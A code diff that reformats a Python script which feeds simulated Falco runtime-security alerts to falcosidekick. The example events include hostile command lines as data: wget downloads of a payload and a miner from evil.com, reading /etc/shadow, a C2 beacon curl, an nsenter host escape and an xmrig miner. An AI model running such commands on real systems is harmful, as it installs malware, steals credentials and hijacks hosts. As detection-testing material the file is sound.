@@ -52,14 +52,25 @@ RULES = [
         "rule": "Contact K8S API Server From Container",
         "priority": "Warning",
         "output_tpl": "Unexpected connection to K8s API Server (user={user} container_id={cid} container_name={cname} connection=172.17.0.1:6443)",
-        "fields": {"proc.name": "curl", "proc.cmdline": "curl https://kubernetes.default.svc", "fd.sip": "172.17.0.1", "fd.sport": "6443", "user.name": "root"},
+        "fields": {
+            "proc.name": "curl",
+            "proc.cmdline": "curl https://kubernetes.default.svc",
+            "fd.sip": "172.17.0.1",
+            "fd.sport": "6443",
+            "user.name": "root",
+        },
         "tags": ["container", "network", "k8s", "mitre_discovery"],
     },
     {
         "rule": "Read sensitive file untrusted",
         "priority": "Warning",
         "output_tpl": "Sensitive file opened for reading (user={user} container_id={cid} container_name={cname} file=/etc/shadow proc=cat)",
-        "fields": {"proc.name": "cat", "proc.cmdline": "cat /etc/shadow", "fd.name": "/etc/shadow", "user.name": "root"},
+        "fields": {
+            "proc.name": "cat",
+            "proc.cmdline": "cat /etc/shadow",
+            "fd.name": "/etc/shadow",
+            "user.name": "root",
+        },
         "tags": ["container", "filesystem", "mitre_credential_access"],
     },
     {
@@ -94,28 +105,48 @@ RULES = [
         "rule": "Modify binary dirs",
         "priority": "Error",
         "output_tpl": "File below a known binary directory opened for writing (user={user} container_id={cid} container_name={cname} file=/usr/bin/malware proc=wget)",
-        "fields": {"proc.name": "wget", "proc.cmdline": "wget -O /usr/bin/malware http://evil.com/payload", "fd.name": "/usr/bin/malware", "user.name": "root"},
+        "fields": {
+            "proc.name": "wget",
+            "proc.cmdline": "wget -O /usr/bin/malware http://evil.com/payload",
+            "fd.name": "/usr/bin/malware",
+            "user.name": "root",
+        },
         "tags": ["container", "filesystem", "mitre_persistence"],
     },
     {
         "rule": "Change thread namespace",
         "priority": "Warning",
         "output_tpl": "Namespace change detected (user={user} container_id={cid} container_name={cname} proc=nsenter)",
-        "fields": {"proc.name": "nsenter", "proc.cmdline": "nsenter --target 1 --mount --uts --ipc --net --pid", "user.name": "root"},
+        "fields": {
+            "proc.name": "nsenter",
+            "proc.cmdline": "nsenter --target 1 --mount --uts --ipc --net --pid",
+            "user.name": "root",
+        },
         "tags": ["container", "namespace", "mitre_privilege_escalation"],
     },
     {
         "rule": "Drop and execute new binary in container",
         "priority": "Critical",
         "output_tpl": "New binary executed in container (user={user} container_id={cid} container_name={cname} proc=/tmp/payload)",
-        "fields": {"proc.name": "payload", "proc.cmdline": "/tmp/payload", "proc.exepath": "/tmp/payload", "user.name": "root"},
+        "fields": {
+            "proc.name": "payload",
+            "proc.cmdline": "/tmp/payload",
+            "proc.exepath": "/tmp/payload",
+            "user.name": "root",
+        },
         "tags": ["container", "process", "mitre_execution"],
     },
     {
         "rule": "Outbound Connection to C2 Servers",
         "priority": "Critical",
         "output_tpl": "Outbound connection to known C2 server (user={user} container_id={cid} container_name={cname} dest=198.51.100.1:443)",
-        "fields": {"proc.name": "curl", "proc.cmdline": "curl https://198.51.100.1/beacon", "fd.sip": "198.51.100.1", "fd.sport": "443", "user.name": "root"},
+        "fields": {
+            "proc.name": "curl",
+            "proc.cmdline": "curl https://198.51.100.1/beacon",
+            "fd.sip": "198.51.100.1",
+            "fd.sport": "443",
+            "user.name": "root",
+        },
         "tags": ["container", "network", "mitre_command_and_control"],
     },
     {
@@ -129,7 +160,12 @@ RULES = [
         "rule": "Container Drift Detected (chmod)",
         "priority": "Error",
         "output_tpl": "Drift detected: chmod on binary (user={user} container_id={cid} container_name={cname} file=/usr/bin/python3)",
-        "fields": {"proc.name": "chmod", "proc.cmdline": "chmod +x /usr/bin/python3", "fd.name": "/usr/bin/python3", "user.name": "root"},
+        "fields": {
+            "proc.name": "chmod",
+            "proc.cmdline": "chmod +x /usr/bin/python3",
+            "fd.name": "/usr/bin/python3",
+            "user.name": "root",
+        },
         "tags": ["container", "process", "mitre_defense_evasion"],
     },
     {
@@ -154,7 +190,13 @@ INFRA_RULES = [
         "rule": "Unexpected outbound connection",
         "priority": "Warning",
         "output_tpl": "Unexpected outbound connection from infra container (user={user} container_id={cid} container_name={cname} dest=203.0.113.50:8080)",
-        "fields": {"proc.name": "curl", "proc.cmdline": "curl http://203.0.113.50:8080", "fd.sip": "203.0.113.50", "fd.sport": "8080", "user.name": "root"},
+        "fields": {
+            "proc.name": "curl",
+            "proc.cmdline": "curl http://203.0.113.50:8080",
+            "fd.sip": "203.0.113.50",
+            "fd.sport": "8080",
+            "user.name": "root",
+        },
         "tags": ["container", "network", "mitre_exfiltration"],
     },
     {
@@ -175,7 +217,12 @@ INFRA_RULES = [
         "rule": "DB program spawned process",
         "priority": "Warning",
         "output_tpl": "Database spawned unexpected process (user={user} container_id={cid} container_name={cname} parent=postgres proc=bash)",
-        "fields": {"proc.name": "bash", "proc.pname": "postgres", "proc.cmdline": "bash -c id", "user.name": "postgres"},
+        "fields": {
+            "proc.name": "bash",
+            "proc.pname": "postgres",
+            "proc.cmdline": "bash -c id",
+            "user.name": "postgres",
+        },
         "tags": ["container", "process", "mitre_execution"],
     },
     {
@@ -196,7 +243,12 @@ INFRA_RULES = [
         "rule": "Container drift detected (open+create)",
         "priority": "Error",
         "output_tpl": "New file created in container (user={user} container_id={cid} container_name={cname} file=/tmp/.hidden_script.sh)",
-        "fields": {"proc.name": "bash", "proc.cmdline": "bash -c echo payload > /tmp/.hidden_script.sh", "fd.name": "/tmp/.hidden_script.sh", "user.name": "root"},
+        "fields": {
+            "proc.name": "bash",
+            "proc.cmdline": "bash -c echo payload > /tmp/.hidden_script.sh",
+            "fd.name": "/tmp/.hidden_script.sh",
+            "user.name": "root",
+        },
         "tags": ["container", "filesystem", "mitre_defense_evasion"],
     },
     {
@@ -210,14 +262,23 @@ INFRA_RULES = [
         "rule": "Unexpected process in monitoring container",
         "priority": "Error",
         "output_tpl": "Unexpected process in monitoring container (user={user} container_id={cid} container_name={cname} proc=wget parent=sh)",
-        "fields": {"proc.name": "wget", "proc.cmdline": "wget http://evil.com/miner", "proc.pname": "sh", "user.name": "root"},
+        "fields": {
+            "proc.name": "wget",
+            "proc.cmdline": "wget http://evil.com/miner",
+            "proc.pname": "sh",
+            "user.name": "root",
+        },
         "tags": ["container", "process", "mitre_execution"],
     },
     {
         "rule": "Crypto mining process detected",
         "priority": "Critical",
         "output_tpl": "Possible crypto miner detected (user={user} container_id={cid} container_name={cname} proc=xmrig cmdline=xmrig --donate-level 1)",
-        "fields": {"proc.name": "xmrig", "proc.cmdline": "xmrig --donate-level 1 -o pool.minexmr.com:4444", "user.name": "root"},
+        "fields": {
+            "proc.name": "xmrig",
+            "proc.cmdline": "xmrig --donate-level 1 -o pool.minexmr.com:4444",
+            "user.name": "root",
+        },
         "tags": ["container", "process", "mitre_resource_hijacking"],
     },
 ]
@@ -235,14 +296,25 @@ SCANNER_RULES = [
         "rule": "Write below root",
         "priority": "Error",
         "output_tpl": "File written below / (user={user} container_id={cid} container_name={cname} file=/scan_results.json proc=python3)",
-        "fields": {"proc.name": "python3", "proc.cmdline": "python3 scanner.py", "fd.name": "/scan_results.json", "user.name": "root"},
+        "fields": {
+            "proc.name": "python3",
+            "proc.cmdline": "python3 scanner.py",
+            "fd.name": "/scan_results.json",
+            "user.name": "root",
+        },
         "tags": ["container", "filesystem", "mitre_persistence"],
     },
     {
         "rule": "Outbound connection from scanner",
         "priority": "Notice",
         "output_tpl": "Scanner made outbound connection (user={user} container_id={cid} container_name={cname} dest=ghcr.io:443 proc=trivy)",
-        "fields": {"proc.name": "trivy", "proc.cmdline": "trivy image --download-db-only", "fd.sip": "140.82.121.34", "fd.sport": "443", "user.name": "root"},
+        "fields": {
+            "proc.name": "trivy",
+            "proc.cmdline": "trivy image --download-db-only",
+            "fd.sip": "140.82.121.34",
+            "fd.sport": "443",
+            "user.name": "root",
+        },
         "tags": ["container", "network", "mitre_exfiltration"],
     },
 ]
@@ -351,9 +423,9 @@ def _print_metrics():
 def main():
     print(f"Sending Falco events to falcosidekick at {SIDEKICK_URL}")
     print(
-        f"Containers: {len(CONTAINERS)} (target: {sum(1 for c in CONTAINERS if c['group']=='target')}, "
-        f"infra: {sum(1 for c in CONTAINERS if c['group']=='infra')}, "
-        f"scanner: {sum(1 for c in CONTAINERS if c['group']=='scanner')})"
+        f"Containers: {len(CONTAINERS)} (target: {sum(1 for c in CONTAINERS if c['group'] == 'target')}, "
+        f"infra: {sum(1 for c in CONTAINERS if c['group'] == 'infra')}, "
+        f"scanner: {sum(1 for c in CONTAINERS if c['group'] == 'scanner')})"
     )
     print(f"Rules: {len(RULES)} base + {len(INFRA_RULES)} infra + {len(SCANNER_RULES)} scanner")
     print()
